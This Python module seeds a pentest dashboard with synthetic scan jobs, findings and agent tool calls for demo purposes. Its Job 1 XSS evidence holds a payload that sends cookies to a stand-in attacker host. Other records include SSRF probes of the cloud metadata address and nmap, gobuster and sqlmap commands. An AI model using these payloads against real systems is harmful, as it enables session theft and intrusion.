"""Demo-mode seed data for the OSS dashboard.

When ``FENNEC_DEMO_SEED=1`` is set (and the in-memory store is empty),
the FastAPI server pre-populates a handful of fake targets, scans,
hypotheses, and findings on startup so newcomers can see what the
dashboard looks like with realistic data — without needing an API key
or a real target.

All data is synthetic. The endpoints / payloads / CVE-style descriptions
are crafted to look like a typical web-app pentest output, not pulled
from any real engagement. The default target is set to ``fenneclabs.ai``
because that's the canonical example in the README, but no actual
traffic is sent — these are pre-baked records, not the output of a
running scan.

The seed is idempotent: if the JOBS dict already contains anything it
no-ops, so it never collides with real scans.
"""

from __future__ import annotations

import uuid
from datetime import datetime, timedelta, timezone

from .job_store import (
    CREDENTIALS,
    CredentialRecord,
    JOBS,
    Job,
    TARGETS,
    TargetRecord,
)


def _ts(days_ago: float = 0, hours_ago: float = 0, minutes_ago: float = 0) -> str:
    """Build a UTC ISO timestamp offset from now — handy for spreading
    fake scans across the last few days so the trend chart has shape."""
    return (
        datetime.now(timezone.utc)
        - timedelta(days=days_ago, hours=hours_ago, minutes=minutes_ago)
    ).isoformat()


def _hyp(
    *,
    hid: str,
    title: str,
    description: str,
    status: str,
    result: str | None,
    severity: str | None,
    priority: float,
    owasp_category: str | None = None,
    days_ago: float = 1,
    completed_minutes_ago: float | None = None,
) -> dict:
    """Build a hypothesis dict in the shape the frontend's
    HypothesisResult type expects."""
    return {
        "id": hid,
        "title": title,
        "description": description,
        "status": status,
        "result": result,
        "severity": severity,
        "priority": priority,
        "parent_id": None,
        "children_ids": [],
        "required_agent": "pentester",
        "owasp_category": owasp_category,
        "findings": [],
        "steps": [],
        "tasks": None,
        "blocked_by": None,
        "waiting_for": None,
        "expected_outputs": [],
        "actual_outputs": [],
        "created_at": _ts(days_ago=days_ago + 0.01),
        "started_at": _ts(days_ago=days_ago) if status != "pending" else None,
        "completed_at": (
            _ts(days_ago=days_ago, minutes_ago=completed_minutes_ago)
            if completed_minutes_ago is not None
            else None
        ),
    }


def _finding(
    *,
    fid: str,
    job_id: str,
    title: str,
    description: str,
    severity: str,
    location: str,
    parameter: str,
    evidence: str,
    vuln_type: str,
    cwe: str | None,
    hypothesis_id: str | None,
    days_ago: float = 1,
) -> dict:
    """FindingDetail shape — used by /dashboard/findings + per-job lists."""
    return {
        "id": fid,
        "job_id": job_id,
        "title": title,
        "description": description,
        "severity": severity,
        "status": "confirmed",
        "location": location,
        "parameter": parameter,
        "evidence": evidence,
        "reproduction_steps": [
            "Send the request shown in 'evidence' against the target.",
            "Observe the response — the highlighted field confirms exploitability.",
            "Replay with different inputs to verify the boundary.",
        ],
        "vulnerability_type": vuln_type,
        "cwe_id": cwe,
        "hypothesis_id": hypothesis_id,
        "discovered_at": _ts(days_ago=days_ago),
        "discovered_by": "pentester",
    }


def _pentester_result(
    *,
    fid: int,
    job_id: str,
    verdict: str,
    overview: str,
    impact: str,
    remediation: str,
    owasp: str,
    evidence_lines: list[str],
    days_ago: float = 1,
) -> dict:
    """RichFinding shape (used by the dashboard's findings table)."""
    return {
        "id": fid,
        "job_id": job_id,
        "hypothesis_id": None,
        "status": "completed",
        "verdict": verdict,
        "evidence": evidence_lines,
        "suggested_followups": [],
        "needs": [],
        "error": None,
        "description_overview": overview,
        "description_breakdown": None,
        "description_technical": None,
        "impact_demonstrated": impact,
        "impact_attack_scenarios": None,
        "impact_business_risk": None,
        "evidence_logged": None,
        "evidence_payloads": None,
        "evidence_observed": None,
        "remediation_primary": remediation,
        "remediation_implementation": None,
        "remediation_hardening": None,
        "owasp_category": owasp,
        "created_at": _ts(days_ago=days_ago),
    }


def _tool_call(
    *,
    job_id: str,
    tool_name: str,
    tool_input: dict,
    agent: str,
    success: bool,
    result: str,
    minutes_ago: float,
) -> dict:
    return {
        "id": str(uuid.uuid4())[:8],
        "session_id": job_id,
        "tool_name": tool_name,
        "tool_input": tool_input,
        "agent": agent,
        "success": success,
        "result": result,
        "error": "" if success else "non-zero exit",
        "timestamp": _ts(minutes_ago=minutes_ago),
    }


def seed_demo() -> None:
    """Idempotently populate the in-memory store with realistic demo data.

    Skips if anything is already in JOBS — never overwrites real scans.
    """
    if JOBS.all():
        return

    # ---- Targets ----------------------------------------------------
    t_main = TargetRecord(
        id=str(uuid.uuid4()),
        domain="fenneclabs.ai",
        name="Fennec Labs (production)",
        verified=True,
        verification_token=None,
        last_scanned=_ts(hours_ago=2),
        created_at=_ts(days_ago=21),
        updated_at=_ts(days_ago=21),
    )
    t_staging = TargetRecord(
        id=str(uuid.uuid4()),
        domain="staging.fenneclabs.ai",
        name="Fennec Labs (staging)",
        verified=True,
        verification_token=None,
        last_scanned=_ts(days_ago=1, hours_ago=4),
        created_at=_ts(days_ago=18),
        updated_at=_ts(days_ago=18),
    )
    t_demo = TargetRecord(
        id=str(uuid.uuid4()),
        domain="demo-app.internal.fennec.dev",
        name="Internal demo app",
        verified=False,
        verification_token="vrfy_kJ8aLpQ2",
        last_scanned=None,
        created_at=_ts(days_ago=3),
        updated_at=None,
    )
    for t in (t_main, t_staging, t_demo):
        TARGETS[t.id] = t

    # ---- Credentials (production target has a test user) ------------
    cred = CredentialRecord(
        id=str(uuid.uuid4()),
        target_id=t_main.id,
        name="QA test account",
        username="qa-tester@fenneclabs.ai",
        password="****",  # demo-only placeholder
        auth_type="basic",
        created_at=_ts(days_ago=20),
    )
    CREDENTIALS[cred.id] = cred

    # ---- Job 1: production scan, completed, mixed findings ----------
    j1 = Job(
        id=str(uuid.uuid4()),
        name="Production baseline — fenneclabs.ai",
        target_url="https://fenneclabs.ai",
        mode="black_box",
        method="balanced",
        htli=False,
        target_id=t_main.id,
        credential_id=cred.id,
        description="Scheduled weekly authenticated pass against the production marketing + API surface.",
        timeout_seconds=900,
        status="completed",
        success=True,
        created_at=_ts(hours_ago=2, minutes_ago=20),
        updated_at=_ts(hours_ago=1, minutes_ago=42),
        final_result=(
            "Confirmed 3 vulnerabilities across the API surface: one high-severity IDOR "
            "on /api/users/{id}, a medium-severity stored XSS in the support contact form, "
            "and a low-severity verbose error disclosing the Postgres version on /api/health."
        ),
    )
    j1.recon_result = {
        "session_id": j1.id,
        "target_url": j1.target_url,
        "recon_completed": True,
        "summary": "API-driven SaaS on fastapi + react. Bearer auth, REST surface across 18 endpoints, Nginx in front.",
        "ip_address": "203.0.113.42",
        "ports_open": [80, 443, 22],
        "technologies": [
            {"name": "Nginx", "version": "1.25", "type": "web_server", "confidence": 0.98},
            {"name": "FastAPI", "version": "0.115", "type": "framework", "confidence": 0.95},
            {"name": "PostgreSQL", "version": "15", "type": "database", "confidence": 0.7},
            {"name": "React", "version": "18.2", "type": "frontend", "confidence": 0.99},
            {"name": "Cloudflare", "version": None, "type": "cdn", "confidence": 1.0},
        ],
        "endpoints": [
            {"path": "/api/auth/login", "method": "POST", "parameters": ["email", "password"], "auth_required": False, "response_type": "json", "notes": "bearer issuance"},
            {"path": "/api/users/{id}", "method": "GET", "parameters": ["id"], "auth_required": True, "response_type": "json", "notes": "IDOR candidate — shallow ownership check"},
            {"path": "/api/scans", "method": "POST", "parameters": ["target_url", "mode"], "auth_required": True, "response_type": "json", "notes": ""},
            {"path": "/api/support/contact", "method": "POST", "parameters": ["subject", "message"], "auth_required": False, "response_type": "html", "notes": "renders user input unescaped"},
            {"path": "/api/health", "method": "GET", "parameters": [], "auth_required": False, "response_type": "json", "notes": "leaks postgres version"},
        ],
        "entry_points": [
            {"location": "/api/users/{id}", "type": "path_param", "input_type": "integer", "validation_observed": "none", "notes": "no ownership check vs JWT subject"},
            {"location": "/api/support/contact (message field)", "type": "body", "input_type": "string", "validation_observed": "length only", "notes": "rendered back into admin panel HTML"},
        ],
        "auth_type": "bearer_token",
        "login_endpoint": "/api/auth/login",
        "registration_available": True,
        "headers_of_interest": ["Strict-Transport-Security", "X-Frame-Options", "Content-Security-Policy"],
        "cookies_observed": ["fennec_session", "cf_clearance"],
        "default_credentials_found": False,
        "notes": [
            "Login rate limit appears generous (>50 req/min observed).",
            "JWT uses HS256 — verify signing key rotation policy.",
        ],
    }
    j1.hypotheses = [
        _hyp(hid="H1", title="IDOR on /api/users/{id}", description="The endpoint returns any user profile by ID; auth check appears shallow.", status="completed", result="vulnerable", severity="high", priority=0.92, owasp_category="A01:2021 Broken Access Control", days_ago=0.08, completed_minutes_ago=72),
        _hyp(hid="H2", title="Stored XSS in /api/support/contact", description="Message body is rendered unescaped into the admin review panel.", status="completed", result="vulnerable", severity="medium", priority=0.78, owasp_category="A03:2021 Injection", days_ago=0.08, completed_minutes_ago=58),
        _hyp(hid="H3", title="Postgres version leak via /api/health", description="Verbose error path includes 'PostgreSQL 15.4' in the response.", status="completed", result="vulnerable", severity="low", priority=0.4, owasp_category="A05:2021 Security Misconfiguration", days_ago=0.08, completed_minutes_ago=45),
        _hyp(hid="H4", title="SQL injection on /api/auth/login (email field)", description="Single-quote payload — checking for error-based or time-based SQLi.", status="completed", result="safe", severity=None, priority=0.85, owasp_category="A03:2021 Injection", days_ago=0.08, completed_minutes_ago=38),
        _hyp(hid="H5", title="SSRF via webhook callback URL", description="POST /api/webhooks accepts arbitrary URLs.", status="completed", result="safe", severity=None, priority=0.7, owasp_category="A10:2021 SSRF", days_ago=0.08, completed_minutes_ago=30),
        _hyp(hid="H6", title="JWT 'none' algorithm bypass", description="Test whether forged tokens with alg=none are accepted.", status="completed", result="safe", severity=None, priority=0.6, owasp_category="A07:2021 Identification & Authentication Failures", days_ago=0.08, completed_minutes_ago=22),
        _hyp(hid="H7", title="CSRF on /api/scans (POST)", description="Confirm SameSite cookie + CSRF token enforcement.", status="completed", result="safe", severity=None, priority=0.55, owasp_category="A01:2021 Broken Access Control", days_ago=0.08, completed_minutes_ago=18),
        _hyp(hid="H8", title="Open redirect via ?next= on /login", description="Common pattern when login redirects to a user-supplied URL.", status="dead_end", result="inconclusive", severity=None, priority=0.3, owasp_category="A01:2021 Broken Access Control", days_ago=0.08, completed_minutes_ago=12),
    ]
    j1.findings = [
        _finding(fid=f"{j1.id}-f1", job_id=j1.id, title="IDOR on /api/users/{id}",
                 description="Authenticated requests for any user ID return the full profile. The endpoint reads the path param without checking ownership against the JWT 'sub' claim.",
                 severity="high", location="/api/users/{id}", parameter="id (path)",
                 evidence="GET /api/users/57 HTTP/1.1\\nAuthorization: Bearer <user-12>\\n\\n→ 200 OK { \"id\": 57, \"email\": \"victim@example.com\", \"role\": \"admin\", ... }",
                 vuln_type="IDOR", cwe="CWE-639", hypothesis_id="H1", days_ago=0.08),
        _finding(fid=f"{j1.id}-f2", job_id=j1.id, title="Stored XSS via support contact form",
                 description="The 'message' field is persisted and rendered into the admin support panel without HTML escaping. An attacker can execute JavaScript in an admin's session.",
                 severity="medium", location="/api/support/contact", parameter="message (body)",
                 evidence="POST /api/support/contact\\n{ \"subject\":\"hi\", \"message\":\"<img src=x onerror=fetch('//attacker/?c='+document.cookie)>\" }\\n\\n→ payload renders verbatim in /admin/support",
                 vuln_type="XSS (stored)", cwe="CWE-79", hypothesis_id="H2", days_ago=0.08),
        _finding(fid=f"{j1.id}-f3", job_id=j1.id, title="PostgreSQL version disclosure via /api/health",
                 description="When the health endpoint hits a degraded state, the response body includes the full Postgres version string. Combined with public CVEs this narrows attack surface.",
                 severity="low", location="/api/health", parameter="-",
                 evidence="GET /api/health\\n→ 503 { \"db\": \"unhealthy\", \"detail\": \"PostgreSQL 15.4 on x86_64-pc-linux-gnu …\" }",
                 vuln_type="Information Disclosure", cwe="CWE-200", hypothesis_id="H3", days_ago=0.08),
    ]
    # Note: the dashboard's FindingsPage uses `verdict` as a severity bucket
    # (critical/high/medium/low/info), not the agent's outcome literal
    # (vulnerable/safe/inconclusive). To make the rich-finding view light
    # up correctly we set verdict = severity here.
    j1.pentester_results = [
        _pentester_result(fid=1, job_id=j1.id, verdict="high",
                          overview="The /api/users/{id} endpoint exposes any user profile to any authenticated caller, regardless of the JWT subject.",
                          impact="An attacker with any valid account can enumerate every user — emails, roles, MFA state — enabling targeted phishing or admin-account takeover.",
                          remediation="In the route handler, compare the requested id to the JWT 'sub' claim and require 'admin' role for cross-user reads. Add an integration test that asserts 403 for cross-tenant access.",
                          owasp="A01:2021 Broken Access Control",
                          evidence_lines=["GET /api/users/57  →  200 OK  (caller is user 12)"],
                          days_ago=0.08),
        _pentester_result(fid=2, job_id=j1.id, verdict="medium",
                          overview="The support contact form persists user-supplied HTML and renders it unescaped in the admin review panel.",
                          impact="An anonymous attacker can execute JavaScript in an admin's browser context, leading to session theft or admin-action forgery.",
                          remediation="Escape the 'message' field on render (e.g. Jinja autoescape) and apply a CSP that blocks inline event handlers in the /admin/* path.",
                          owasp="A03:2021 Injection",
                          evidence_lines=["POST /api/support/contact (with <img onerror=…> payload)  →  rendered raw in /admin/support"],
                          days_ago=0.08),
        _pentester_result(fid=3, job_id=j1.id, verdict="low",
                          overview="The health endpoint leaks the exact PostgreSQL version in error responses.",
                          impact="Lets attackers narrow their CVE search to a specific Postgres minor, reducing exploitation cost.",
                          remediation="Strip the database error detail before serializing the health response — only return {db: healthy|unhealthy} to anonymous callers.",
                          owasp="A05:2021 Security Misconfiguration",
                          evidence_lines=["GET /api/health  →  503 with full Postgres version string"],
                          days_ago=0.08),
    ]
    j1.tool_calls = [
        _tool_call(job_id=j1.id, tool_name="terminal", tool_input={"cmd": "nmap -sV -p 1-1024 fenneclabs.ai"}, agent="recon", success=True, result="22/tcp open ssh, 80/tcp open http, 443/tcp open https (nginx 1.25)", minutes_ago=120),
        _tool_call(job_id=j1.id, tool_name="browser", tool_input={"url": "https://fenneclabs.ai", "action": "fetch"}, agent="recon", success=True, result="200 OK — Fennec Labs landing page, React app loaded", minutes_ago=118),
        _tool_call(job_id=j1.id, tool_name="terminal", tool_input={"cmd": "gobuster dir -u https://fenneclabs.ai -w /usr/share/seclists/Discovery/Web-Content/common.txt"}, agent="recon", success=True, result="/api → 401, /admin → 302, /health → 200, /docs → 200, /pricing → 200", minutes_ago=115),
        _tool_call(job_id=j1.id, tool_name="terminal", tool_input={"cmd": "curl -H 'Authorization: Bearer <token>' https://fenneclabs.ai/api/users/57"}, agent="pentester", success=True, result="HTTP 200 — full user profile for id=57 returned to caller with subject id=12", minutes_ago=74),
        _tool_call(job_id=j1.id, tool_name="terminal", tool_input={"cmd": "curl -X POST https://fenneclabs.ai/api/support/contact -d 'message=<img src=x onerror=alert(1)>&subject=hi'"}, agent="pentester", success=True, result="201 — message stored, admin panel renders raw HTML", minutes_ago=60),
        _tool_call(job_id=j1.id, tool_name="terminal", tool_input={"cmd": "sqlmap -u 'https://fenneclabs.ai/api/auth/login' --data='email=*&password=x' --batch"}, agent="pentester", success=True, result="sqlmap finished — no injection vectors found, login uses parameterised query", minutes_ago=40),
        _tool_call(job_id=j1.id, tool_name="web_search", tool_input={"query": "PostgreSQL 15.4 CVE"}, agent="pentester", success=True, result="3 known CVEs since 15.4 — all backported in 15.5; target is on 15.4 so worth flagging the version leak", minutes_ago=44),
    ]
    JOBS.put(j1)

    # ---- Job 2: running scan ----------------------------------------
    j2 = Job(
        id=str(uuid.uuid4()),
        name="Live scan — fenneclabs.ai",
        target_url="https://fenneclabs.ai",
        mode="black_box",
        method="deep",
        htli=False,
        target_id=t_main.id,
        description="Ad-hoc deep pass triggered after the latest deploy.",
        timeout_seconds=1800,
        status="running",
        created_at=_ts(minutes_ago=8),
    )
    j2.recon_result = dict(j1.recon_result)  # same target, same recon
    j2.recon_result["session_id"] = j2.id
    j2.hypotheses = [
        _hyp(hid="H1", title="IDOR on /api/scans/{job_id}", description="New endpoint exposed in this release — verify ownership check.", status="completed", result="vulnerable", severity="high", priority=0.9, owasp_category="A01:2021 Broken Access Control", days_ago=0.005, completed_minutes_ago=3),
        _hyp(hid="H2", title="SSRF on /api/webhooks/test", description="New 'test webhook' button accepts any URL.", status="in_progress", result=None, severity=None, priority=0.85, owasp_category="A10:2021 SSRF", days_ago=0.005),
        _hyp(hid="H3", title="Reflected XSS on /search", description="Query string is reflected unescaped in the result count.", status="pending", result=None, severity=None, priority=0.6, owasp_category="A03:2021 Injection"),
        _hyp(hid="H4", title="Mass assignment on PATCH /api/users/me", description="Test whether 'role' field is updatable from the client.", status="pending", result=None, severity=None, priority=0.55),
    ]
    j2.findings = [
        _finding(fid=f"{j2.id}-f1", job_id=j2.id, title="IDOR on /api/scans/{job_id}",
                 description="Job results are returned for any job ID, not just those owned by the caller.",
                 severity="high", location="/api/scans/{job_id}", parameter="job_id (path)",
                 evidence="GET /api/scans/4f1e-…  →  200 OK with another tenant's findings",
                 vuln_type="IDOR", cwe="CWE-639", hypothesis_id="H1", days_ago=0.003),
    ]
    j2.tool_calls = [
        _tool_call(job_id=j2.id, tool_name="terminal", tool_input={"cmd": "curl -H 'Authorization: Bearer …' https://fenneclabs.ai/api/scans/4f1e-…"}, agent="pentester", success=True, result="200 — job belonging to another tenant returned", minutes_ago=3),
        _tool_call(job_id=j2.id, tool_name="terminal", tool_input={"cmd": "curl -X POST https://fenneclabs.ai/api/webhooks/test -d 'url=http://169.254.169.254/latest/meta-data/'"}, agent="pentester", success=True, result="awaiting response (in progress)", minutes_ago=1),
    ]
    j2.pentester_results = [
        _pentester_result(fid=1, job_id=j2.id, verdict="high",
                          overview="The /api/scans/{job_id} endpoint returns scan results for any job ID, not just those owned by the authenticated user.",
                          impact="An attacker can enumerate every tenant's scan history and read all confirmed vulnerabilities — a high-value information leak for follow-up exploitation.",
                          remediation="Add a tenant-scoped query: select WHERE owner_id = jwt.sub AND id = path.job_id. Return 404 (not 403) on mismatch to avoid disclosing existence.",
                          owasp="A01:2021 Broken Access Control",
                          evidence_lines=["GET /api/scans/4f1e-…  →  200 OK returning another tenant's findings"],
                          days_ago=0.003),
    ]
    JOBS.put(j2)

    # ---- Job 3: staging scan, medium severity, completed ------------
    j3 = Job(
        id=str(uuid.uuid4()),
        name="Pre-release pass — staging",
        target_url="https://staging.fenneclabs.ai",
        mode="black_box",
        method="balanced",
        htli=False,
        target_id=t_staging.id,
        timeout_seconds=900,
        status="completed",
        success=True,
        created_at=_ts(days_ago=1, hours_ago=4),
        updated_at=_ts(days_ago=1, hours_ago=3, minutes_ago=18),
        final_result="One medium-severity issue: CSRF on the export-data endpoint (no SameSite cookie + no token).",
    )
    j3.hypotheses = [
        _hyp(hid="H1", title="CSRF on /api/users/me/export", description="Endpoint accepts cross-origin POSTs and triggers a data-export email.", status="completed", result="vulnerable", severity="medium", priority=0.7, owasp_category="A01:2021 Broken Access Control", days_ago=1.15, completed_minutes_ago=82),
        _hyp(hid="H2", title="SQL injection on /api/search", description="Search endpoint parameter handling.", status="completed", result="safe", severity=None, priority=0.5, days_ago=1.15, completed_minutes_ago=60),
        _hyp(hid="H3", title="Path traversal on /static/{file}", description="Test ../ payloads.", status="completed", result="safe", severity=None, priority=0.45, days_ago=1.15, completed_minutes_ago=44),
    ]
    j3.findings = [
        _finding(fid=f"{j3.id}-f1", job_id=j3.id, title="CSRF on data-export endpoint",
                 description="POST /api/users/me/export accepts cross-origin form submissions with no CSRF token and the session cookie has SameSite=None.",
                 severity="medium", location="/api/users/me/export", parameter="-",
                 evidence="Cross-origin <form action=https://staging.fenneclabs.ai/api/users/me/export method=POST> triggers email export for the victim.",
                 vuln_type="CSRF", cwe="CWE-352", hypothesis_id="H1", days_ago=1.15),
    ]
    j3.pentester_results = [
        _pentester_result(fid=1, job_id=j3.id, verdict="medium",
                          overview="The data-export endpoint can be invoked from any origin without a CSRF token.",
                          impact="An attacker who lures a logged-in user to a malicious page can trigger a full data export to the victim's own email — useful in social-engineering chains.",
                          remediation="Require a CSRF token tied to the session, OR set SameSite=Strict on the session cookie. Prefer both.",
                          owasp="A01:2021 Broken Access Control",
                          evidence_lines=["Auto-submitting cross-origin form to /api/users/me/export → 200, victim receives export email"],
                          days_ago=1.15),
    ]
    JOBS.put(j3)

    # ---- Job 4: clean run, no findings ------------------------------
    j4 = Job(
        id=str(uuid.uuid4()),
        name="Marketing static-site pass — fenneclabs.ai",
        target_url="https://fenneclabs.ai/about",
        mode="black_box",
        method="turbo",
        htli=False,
        target_id=t_main.id,
        timeout_seconds=300,
        status="completed",
        success=False,  # no findings ≠ failed scan, but the dashboard treats "no vulns" as a clean pass
        created_at=_ts(days_ago=4),
        updated_at=_ts(days_ago=4, hours_ago=-0.1),  # slightly later same-day
        final_result="No vulnerabilities confirmed. The /about marketing page is a static React render — no dynamic input surface.",
    )
    j4.hypotheses = [
        _hyp(hid="H1", title="XSS via marketing CMS content", description="Check if any team-bios are rendered from a CMS unescaped.", status="completed", result="safe", severity=None, priority=0.4, days_ago=4, completed_minutes_ago=22),
        _hyp(hid="H2", title="Subdomain takeover on cdn.fenneclabs.ai", description="Dangling CNAME check.", status="completed", result="safe", severity=None, priority=0.6, days_ago=4, completed_minutes_ago=18),
    ]
    JOBS.put(j4)

    # ---- Job 5: failed scan (Docker not available) ------------------
    j5 = Job(
        id=str(uuid.uuid4()),
        name="Internal demo app — Docker missing",
        target_url="https://demo-app.internal.fennec.dev",
        mode="black_box",
        method="balanced",
        htli=False,
        target_id=t_demo.id,
        timeout_seconds=600,
        status="failed",
        created_at=_ts(days_ago=3, hours_ago=2),
        updated_at=_ts(days_ago=3, hours_ago=1, minutes_ago=58),
        error="Docker image 'fennec-linux' not found locally. Run `cd linux && make build` first.",
    )
    JOBS.put(j5)
